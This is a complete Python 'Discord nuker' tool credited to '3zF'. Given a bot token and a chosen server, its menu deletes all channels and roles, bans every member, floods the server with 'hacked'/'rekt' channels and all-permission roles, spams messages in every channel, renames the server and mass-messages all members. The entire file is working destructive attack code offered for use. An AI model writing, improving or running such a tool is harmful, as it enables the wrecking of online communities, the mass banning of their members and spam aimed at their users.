import discord
import asyncio
import sys
import random
import time
import os
from discord.ext import commands

intents = discord.Intents.all()
client = commands.Bot(command_prefix="!", intents=intents, help_command=None)

guild_target = None
running = True
cnt = {"v": 0}
chan_list = ["hacked", "rekt", "owned"]
role_list = ["nuked", "rekt", "owned"]

R = "\033[91m"
W = "\033[97m"
X = "\033[0m"

@client.event
async def on_ready():
    global guild_target
    os.system("cls || clear")
    
    banner()
    
    guilds = list(client.guilds)
    print(f"\n{R}[>] LOGGED AS : {W}{client.user}{X}")
    print(f"{R}============================================================{X}")
    
    for i, g in enumerate(guilds):
        print(f"{R}  [{i+1}] {W}{g.name} {R}({g.id}){X}")
    
    while True:
        try:
            ch = int(input(f"\n{R}[>] SELECT SERVER : {W}")) - 1
            if 0 <= ch < len(guilds):
                guild_target = guilds[ch]
                break
        except:
            pass
    
    os.system("cls || clear")
    show_target()
    await show_menu()

def banner():
    print(f"""{R}
██████╗ ███████╗██╗  ██╗██████╗ 
╚════██╗██╔════╝██║ ██╔╝██╔══██╗
 █████╔╝╚█████╗ █████╔╝ ██████╔╝
 ╚═══██╗ ╚═══██╗██╔═██╗ ██╔══██╗
██████╔╝██████╔╝██║  ██╗██║  ██║
╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
{R}============================================================{X}
{R}  DEVELOPER : 3zF (Fixed){X}
{R}  TOOL      : DISCORD NUKER{X}
{R}============================================================{X}
    """)

def show_target():
    print(f"""{R}
██████╗ ███████╗██╗  ██╗██████╗ 
╚════██╗██╔════╝██║ ██╔╝██╔══██╗
 █████╔╝╚█████╗ █████╔╝ ██████╔╝
 ╚═══██╗ ╚═══██╗██╔═██╗ ██╔══██╗
██████╔╝██████╔╝██║  ██╗██║  ██║
╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
{R}============================================================{X}
{R}  TARGET : {W}{guild_target.name}{X}
{R}  ID      : {W}{guild_target.id}{X}
{R}============================================================{X}
    """)

async def show_menu():
    global running
    while running:
        print("")
        print(f"""{R}
┌──────────────────────────────────────────────────────────┐
│                                                          │
│              {W}3ZF DISCORD NUKER{R}                          │
│                                                          │
│           {R}[1]{W}  DELETE CHANNELS{R}                         │
│           {R}[2]{W}  DELETE ROLES{R}                             │
│           {R}[3]{W}  BAN ALL MEMBERS{R}                          │
│           {R}[4]{W}  CREATE CHANNELS{R}                           │
│           {R}[5]{W}  CREATE ROLES{R}                              │
│           {R}[6]{W}  SPAM MESSAGES{R}                             │
│           {R}[7]{W}  CHANGE SERVER NAME{R}                        │
│           {R}[8]{W}  DM ALL MEMBERS{R}                            │
│           {R}[0]{W}  EXIT{R}                                      │
│                                                          │
└──────────────────────────────────────────────────────────┘
        {X}""")
        
        try:
            c = input(f"{R}[>] OPTION : {W}").strip()
        except:
            c = ""
        
        if c == "1": await del_chans()
        elif c == "2": await del_roles()
        elif c == "3": await ban_all()
        elif c == "4": await create_chans()
        elif c == "5": await create_roles()
        elif c == "6": await spam_all()
        elif c == "7": await change_name()
        elif c == "8": await dm_all()
        elif c == "0":
            running = False
            print(f"{R}[+] BYE{X}")
            await client.close()
            os._exit(0)

async def del_chans():
    cnt["v"] = 0
    start = time.time()
    chs = guild_target.channels
    for ch in chs:
        try:
            await ch.delete()
            cnt["v"] += 1
            print(f"{R}[+] {W}DELETED: {ch.name}{X}")
        except Exception as e:
            print(f"{R}[-] {W}FAILED: {ch.name} - {e}{X}")
    print(f"\n{R}[+] {W}{cnt['v']}{R} CHANNELS DELETED {W}[{time.time()-start:.2f}s]{X}")
    input(f"{R}[>] ENTER{X}")

async def del_roles():
    cnt["v"] = 0
    start = time.time()
    roles = [r for r in guild_target.roles if r.name != "@everyone"]
    for r in roles:
        try:
            await r.delete()
            cnt["v"] += 1
            print(f"{R}[+] {W}DELETED: {r.name}{X}")
        except Exception as e:
            print(f"{R}[-] {W}FAILED: {r.name} - {e}{X}")
    print(f"\n{R}[+] {W}{cnt['v']}{R} ROLES DELETED {W}[{time.time()-start:.2f}s]{X}")
    input(f"{R}[>] ENTER{X}")

async def ban_all():
    print(f"\n{R}[!] THIS WILL BAN EVERYONE{X}")
    confirm = input(f"{R}[>] TYPE yes : {W}")
    if confirm.lower() != "yes":
        print(f"{R}[-] CANCELLED{X}")
        input(f"{R}[>] ENTER{X}")
        return
    cnt["v"] = 0
    start = time.time()
    await guild_target.fetch_members()
    members = [m for m in guild_target.members if m.id != client.user.id]
    for m in members:
        try:
            await m.ban(reason="3zF")
            cnt["v"] += 1
            print(f"{R}[+] {W}BANNED: {m.name}{X}")
        except Exception as e:
            print(f"{R}[-] {W}FAILED: {m.name} - {e}{X}")
    print(f"\n{R}[+] {W}{cnt['v']}{R} MEMBERS BANNED {W}[{time.time()-start:.2f}s]{X}")
    input(f"{R}[>] ENTER{X}")

async def create_chans():
    try:
        n = int(input(f"{R}[>] HOW MANY CHANNELS : {W}"))
    except:
        print(f"{R}[-] NUMBER{X}")
        return
    cnt["v"] = 0
    start = time.time()
    for i in range(n):
        try:
            name = chan_list[i % len(chan_list)]
            await guild_target.create_text_channel(name)
            cnt["v"] += 1
            print(f"{R}[+] {W}CREATED: {name}{X}")
        except Exception as e:
            print(f"{R}[-] {W}FAILED: {name} - {e}{X}")
    print(f"\n{R}[+] {W}{cnt['v']}{R} CHANNELS CREATED {W}[{time.time()-start:.2f}s]{X}")
    input(f"{R}[>] ENTER{X}")

async def create_roles():
    try:
        n = int(input(f"{R}[>] HOW MANY ROLES : {W}"))
    except:
        print(f"{R}[-] NUMBER{X}")
        return
    cnt["v"] = 0
    start = time.time()
    for i in range(n):
        try:
            name = role_list[i % len(role_list)]
            color = random.randint(0, 0xFFFFFF)
            await guild_target.create_role(name=name, color=discord.Color(color), permissions=discord.Permissions.all())
            cnt["v"] += 1
            print(f"{R}[+] {W}CREATED: {name}{X}")
        except Exception as e:
            print(f"{R}[-] {W}FAILED: {name} - {e}{X}")
    print(f"\n{R}[+] {W}{cnt['v']}{R} ROLES CREATED {W}[{time.time()-start:.2f}s]{X}")
    input(f"{R}[>] ENTER{X}")

async def spam_all():
    try:
        per = int(input(f"{R}[>] PER CHANNEL : {W}"))
    except:
        print(f"{R}[-] NUMBER{X}")
        return
    msg = input(f"{R}[>] MESSAGE : {W}")
    cnt["v"] = 0
    start = time.time()
    chs = [c for c in guild_target.text_channels]
    for ch in chs:
        for i in range(per):
            try:
                await ch.send(msg)
                cnt["v"] += 1
                print(f"{R}[+] {W}SENT: {ch.name} [{i+1}/{per}]{X}")
            except Exception as e:
                print(f"{R}[-] {W}FAILED: {ch.name} - {e}{X}")
                break
    print(f"\n{R}[+] {W}{cnt['v']}{R} MESSAGES SENT {W}[{time.time()-start:.2f}s]{X}")
    input(f"{R}[>] ENTER{X}")

async def change_name():
    name = input(f"{R}[>] NEW NAME : {W}")
    try:
        await guild_target.edit(name=name)
        print(f"{R}[+] NAME CHANGED TO: {W}{name}{X}")
    except Exception as e:
        print(f"{R}[-] FAILED: {e}{X}")
    input(f"{R}[>] ENTER{X}")

async def dm_all():
    msg = input(f"{R}[>] MESSAGE : {W}")
    cnt["v"] = 0
    start = time.time()
    await guild_target.fetch_members()
    members = [m for m in guild_target.members if m.id != client.user.id]
    for m in members:
        try:
            await m.send(msg)
            cnt["v"] += 1
            print(f"{R}[+] {W}DM SENT: {m.name}{X}")
            await asyncio.sleep(0.3)
        except Exception as e:
            print(f"{R}[-] {W}FAILED: {m.name} - {e}{X}")
    print(f"\n{R}[+] {W}{cnt['v']}{R} DMS SENT {W}[{time.time()-start:.2f}s]{X}")
    input(f"{R}[>] ENTER{X}")

while True:
    token = input(f"\n{R}[>] TOKEN : {W}").strip()
    if token:
        break

try:
    client.run(token, reconnect=True)
except:
    os.system("cls || clear")
    banner()
    print(f"{R}[-] INVALID TOKEN OR ERROR{X}")
    time.sleep(2)
    os.execl(sys.executable, sys.executable, *sys.argv)
